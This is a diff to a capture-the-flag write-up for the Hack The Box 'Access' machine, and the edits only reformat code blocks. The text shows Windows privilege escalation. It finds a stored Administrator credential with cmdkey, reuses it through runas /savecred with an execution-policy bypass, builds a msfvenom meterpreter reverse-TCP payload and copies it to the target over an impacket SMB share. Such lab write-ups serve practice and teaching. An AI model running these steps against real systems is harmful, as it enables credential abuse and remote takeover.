@@ -59,12 +59,14 @@ OS Name:                   Microsoft Windows Server 2008 R2 Standard
 
 
 # Stored credential on server
+````
 > cmdkey /list
 Currently stored credentials:
     Target: Domain:interactive=ACCESS\Administrator
                                Type: Domain Password
     User: ACCESS\Administrator
-    
+````
+
 # Look credentials
 C:\Users\security>dir /a C:\Users\security\AppData\Roaming\Microsoft\Credentials\
  Volume in drive C has no label.
@@ -110,10 +112,10 @@ runas /user:ACCESS\administrator /savecred "powershell -ExecutionPolicy Bypass -
 ##### MEth 2 : ok
 
 First generate the exe with msfvenom.
-$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=12345 -f exe -o meter-rev-12345.exe
+    $ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=12345 -f exe -o meter-rev-12345.exe
 
 Next, spin up an smb server on kali pointed at the directory where the exe resides.
-$ impacket-smbserver epi /root/htb/access
+    $ impacket-smbserver epi /root/htb/access
 
 On target, simply copy the file from kali using a normal UNC path.
 C:\Users\security> copy \\10.10.14.77\epi\meter-rev-12345.exe
